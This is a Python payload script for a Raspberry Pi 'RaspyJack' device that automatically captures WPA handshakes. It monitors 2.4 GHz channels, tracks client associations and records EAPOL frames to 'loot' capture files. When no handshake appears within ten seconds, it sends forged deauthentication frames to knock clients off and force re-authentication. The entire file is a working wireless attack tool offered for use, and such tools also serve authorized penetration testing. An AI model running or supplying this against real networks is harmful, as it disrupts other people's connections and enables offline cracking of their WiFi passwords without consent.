#!/usr/bin/env python3
"""
RaspyJack Payload -- Automatic WiFi Handshake Capture
=====================================================
Author: 7h30th3r0n3

Continuously monitors all 2.4 GHz channels for client associations.
When a Dot11AssoResp is detected, begins capturing EAPOL frames for
that BSSID.  If no handshake within 10 seconds, sends a single deauth
to trigger re-authentication.  Saves .cap files automatically.

Setup / Prerequisites
---------------------
- USB WiFi dongle with monitor mode + packet injection
- pip install scapy
- apt install aircrack-ng (for aircrack-ng -a2 verification, optional)

Controls
--------
  OK         -- Start / stop auto-capture
  UP / DOWN  -- Scroll captured handshakes
  KEY1       -- Toggle deauth assist on/off
  KEY2       -- Export all captures to loot
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/Handshakes/
"""

import os
import sys
import time
import threading
import subprocess
import copy
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11AssoResp, Dot11Deauth,
        Dot11Auth, EAPOL, RadioTap, sendp, wrpcap,
        sniff as scapy_sniff, conf, raw,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ── Pin / LCD setup ──────────────────────────────────────────────────────────
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ── Constants ────────────────────────────────────────────────────────────────
LOOT_DIR = "/root/Raspyjack/loot/Handshakes"
CHANNELS_24 = list(range(1, 14))
ROWS_VISIBLE = 6
ROW_H = 12
DEAUTH_TIMEOUT = 10      # seconds before deauth assist
HANDSHAKE_EAPOL_MIN = 2  # minimum EAPOL frames to call it a capture

# ── Shared state ─────────────────────────────────────────────────────────────
lock = threading.Lock()
capturing = False
mon_iface = None
deauth_enabled = True
scroll_pos = 0
status_msg = "Idle"
_running = True

# Per-BSSID tracking
# bssid -> {ssid, channel, eapol_pkts: [], first_seen, deauthed, saved_path}
targets = {}
captures = []   # [{bssid, ssid, path, ts, eapol_count}]
ap_channels = {}  # bssid -> channel (from beacons)


# ── Onboard WiFi detection ──────────────────────────────────────────────────

def _is_onboard_wifi_iface(iface):
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver")
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_external_wifi():
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if not name.startswith("wlan"):
                continue
            if not os.path.isdir(f"/sys/class/net/{name}/wireless"):
                continue
            if _is_onboard_wifi_iface(name):
                continue
            return name
    except Exception:
        pass
    return None


# ── Monitor mode helpers ────────────────────────────────────────────────────

def _enable_monitor(iface):
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iw", iface, "set", "type", "monitor"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)
    return iface


def _disable_monitor(iface):
    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                       capture_output=True, timeout=5)
        subprocess.run(["sudo", "iw", iface, "set", "type", "managed"],
                       capture_output=True, timeout=5)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                       capture_output=True, timeout=5)
    except Exception:
        pass


def _set_channel(iface, ch):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
                   capture_output=True, timeout=3)


# ── Deauth helper ───────────────────────────────────────────────────────────

def _send_deauth(bssid, client_mac, iface):
    """Send a single deauth frame to trigger re-authentication."""
    if not SCAPY_OK:
        return
    pkt = (RadioTap()
           / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid)
           / Dot11Deauth(reason=7))
    try:
        sendp(pkt, iface=iface, count=3, inter=0.05, verbose=False)
    except Exception:
        pass


# ── Save capture ─────────────────────────────────────────────────────────────

def _save_capture(bssid, info):
    """Save EAPOL packets as a .cap file."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_ssid = "".join(c if c.isalnum() or c in "_-" else "_"
                        for c in (info.get("ssid", "") or "unknown"))
    fname = f"hs_{safe_ssid}_{ts}.cap"
    path = os.path.join(LOOT_DIR, fname)
    try:
        wrpcap(path, info["eapol_pkts"])
    except Exception:
        return None
    entry = {
        "bssid": bssid,
        "ssid": info.get("ssid", "?"),
        "path": path,
        "ts": ts,
        "eapol_count": len(info["eapol_pkts"]),
    }
    with lock:
        captures.append(entry)
    return path


# ── Packet handler ──────────────────────────────────────────────────────────

def _pkt_handler(pkt):
    global status_msg

    if not pkt.haslayer(Dot11):
        return

    # Track AP channels from beacons
    if pkt.haslayer(Dot11Beacon):
        bssid = (pkt[Dot11].addr2 or "").upper()
        elt = pkt[Dot11Elt]
        ch = 0
        while elt:
            if elt.ID == 3 and elt.info:
                ch = elt.info[0]
                break
            elt = (elt.payload if hasattr(elt, "payload")
                   and isinstance(elt.payload, Dot11Elt) else None)
        ssid = ""
        elt2 = pkt[Dot11Elt]
        if elt2 and elt2.ID == 0 and elt2.info:
            try:
                ssid = elt2.info.decode("utf-8", errors="replace")
            except Exception:
                pass
        if bssid and ch:
            with lock:
                ap_channels[bssid] = ch
                if bssid in targets and not targets[bssid].get("ssid"):
                    targets[bssid] = {**targets[bssid], "ssid": ssid}

    # Association response -> new target
    if pkt.haslayer(Dot11AssoResp):
        bssid = (pkt[Dot11].addr2 or "").upper()
        client = (pkt[Dot11].addr1 or "").upper()
        if not bssid or bssid == "FF:FF:FF:FF:FF:FF":
            return
        with lock:
            if bssid not in targets:
                ch = ap_channels.get(bssid, 0)
                targets[bssid] = {
                    "ssid": "", "channel": ch,
                    "eapol_pkts": [], "first_seen": time.time(),
                    "deauthed": False, "client": client,
                    "saved_path": None,
                }
                status_msg = f"Track: {bssid[-8:]}"

    # EAPOL frame -> capture
    if pkt.haslayer(EAPOL):
        bssid = None
        ds = pkt[Dot11].FCfield & 0x3
        if ds == 1:
            bssid = (pkt[Dot11].addr1 or "").upper()
        elif ds == 2:
            bssid = (pkt[Dot11].addr2 or "").upper()
        else:
            bssid = (pkt[Dot11].addr3 or "").upper()

        if not bssid:
            return

        with lock:
            if bssid in targets:
                info = targets[bssid]
                new_pkts = list(info["eapol_pkts"]) + [pkt]
                targets[bssid] = {**info, "eapol_pkts": new_pkts}
                status_msg = f"EAPOL {bssid[-8:]}:{len(new_pkts)}"

                if len(new_pkts) >= HANDSHAKE_EAPOL_MIN and not info.get("saved_path"):
                    # Save in a separate thread to avoid blocking sniff
                    save_info = dict(targets[bssid])
                    targets[bssid] = {**targets[bssid], "saved_path": "pending"}
                    threading.Thread(
                        target=_save_capture,
                        args=(bssid, save_info),
                        daemon=True,
                    ).start()


# ── Deauth assist thread ────────────────────────────────────────────────────

def _deauth_assist_thread():
    """Check tracked BSSIDs and send deauth if no EAPOL after timeout."""
    while True:
        with lock:
            if not capturing:
                break
            de = deauth_enabled
            iface = mon_iface
            tgts = dict(targets)

        if not de or not iface:
            time.sleep(1)
            continue

        now = time.time()
        for bssid, info in tgts.items():
            if info.get("deauthed") or info.get("saved_path"):
                continue
            if not info.get("eapol_pkts") and (now - info["first_seen"]) > DEAUTH_TIMEOUT:
                client = info.get("client", "ff:ff:ff:ff:ff:ff")
                ch = info.get("channel", 0) or ap_channels.get(bssid, 0)
                if ch and iface:
                    _set_channel(iface, ch)
                    time.sleep(0.1)
                    _send_deauth(bssid, client, iface)
                    with lock:
                        if bssid in targets:
                            targets[bssid] = {**targets[bssid], "deauthed": True}

        time.sleep(2)


# ── Channel hopping ─────────────────────────────────────────────────────────

def _channel_hop():
    idx = 0
    while True:
        with lock:
            if not capturing:
                break
            iface = mon_iface
        if not iface:
            break
        _set_channel(iface, CHANNELS_24[idx])
        idx = (idx + 1) % len(CHANNELS_24)
        time.sleep(0.3)


def _sniff_thread():
    with lock:
        iface = mon_iface
    if not iface:
        return
    try:
        scapy_sniff(
            iface=iface, prn=_pkt_handler, store=False,
            stop_filter=lambda _: not capturing,
        )
    except Exception:
        pass


# ── Start / stop ─────────────────────────────────────────────────────────────

def _start_capture():
    global capturing, mon_iface, status_msg
    ext = _find_external_wifi()
    if not ext:
        with lock:
            status_msg = "No USB WiFi"
        return
    if not SCAPY_OK:
        with lock:
            status_msg = "scapy missing"
        return
    iface = _enable_monitor(ext)
    with lock:
        mon_iface = iface
        capturing = True
        status_msg = f"Capture on {iface}"
    threading.Thread(target=_channel_hop, daemon=True).start()
    threading.Thread(target=_sniff_thread, daemon=True).start()
    threading.Thread(target=_deauth_assist_thread, daemon=True).start()


def _stop_capture():
    global capturing, status_msg
    with lock:
        capturing = False
        iface = mon_iface
        status_msg = "Stopped"
    time.sleep(0.5)
    if iface:
        _disable_monitor(iface)


# ── Export all ───────────────────────────────────────────────────────────────

def _export_all():
    """Save any unsaved targets that have EAPOL packets."""
    saved = 0
    with lock:
        tgts = dict(targets)
    for bssid, info in tgts.items():
        if info["eapol_pkts"] and not info.get("saved_path"):
            path = _save_capture(bssid, info)
            if path:
                with lock:
                    if bssid in targets:
                        targets[bssid] = {**targets[bssid], "saved_path": path}
                saved += 1
    return saved


# ── Drawing ──────────────────────────────────────────────────────────────────

def _draw_screen():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    with lock:
        active = capturing
        msg = status_msg
        de = deauth_enabled
        sp = scroll_pos
        n_targets = len(targets)
        cap_list = list(captures)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "AUTO HANDSHAKE", font=font, fill="#FF5722")
    color = "#00FF00" if active else "#FF0000"
    d.ellipse((118, 3, 126, 11), fill=color)

    y = 15
    de_str = "ON" if de else "OFF"
    d.text((2, y), f"Trk:{n_targets} Cap:{len(cap_list)} DA:{de_str}",
           font=font, fill="#888")
    y += 12
    d.text((2, y), msg[:22], font=font, fill="#FFAA00")
    y += 14

    # Capture list
    end = min(sp + ROWS_VISIBLE, len(cap_list))
    for i in range(sp, end):
        c = cap_list[i]
        ssid = (c["ssid"] or "?")[:10]
        cnt = c["eapol_count"]
        d.text((2, y), f"{ssid} [{cnt}] {c['ts'][-6:]}", font=font, fill="#00FF00")
        y += ROW_H

    if not cap_list:
        d.text((2, y), "No captures yet", font=font, fill="#555")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    lbl = "OK:Stop" if active else "OK:Go"
    d.text((2, 117), f"{lbl} K1:DA K2:Exp K3:X", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    global scroll_pos, deauth_enabled, status_msg

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 10), "AUTO HANDSHAKE", font=font, fill="#FF5722")
    d.text((4, 28), "Automatic WPA2/3", font=font, fill="#888")
    d.text((4, 40), "handshake capture.", font=font, fill="#888")
    d.text((4, 60), "OK=Start  K1=Deauth", font=font, fill="#666")
    d.text((4, 72), "K2=Export  K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.0)

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            if btn == "OK":
                with lock:
                    active = capturing
                if active:
                    _stop_capture()
                else:
                    _start_capture()
                time.sleep(0.3)

            elif btn == "UP":
                with lock:
                    scroll_pos = max(0, scroll_pos - 1)
                time.sleep(0.2)

            elif btn == "DOWN":
                with lock:
                    scroll_pos = min(scroll_pos + 1, max(0, len(captures) - ROWS_VISIBLE))
                time.sleep(0.2)

            elif btn == "KEY1":
                with lock:
                    deauth_enabled = not deauth_enabled
                    status_msg = f"Deauth: {'ON' if deauth_enabled else 'OFF'}"
                time.sleep(0.3)

            elif btn == "KEY2":
                saved = _export_all()
                with lock:
                    status_msg = f"Exported {saved} new"
                time.sleep(0.3)

            _draw_screen()
            time.sleep(0.05)

    finally:
        _stop_capture()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
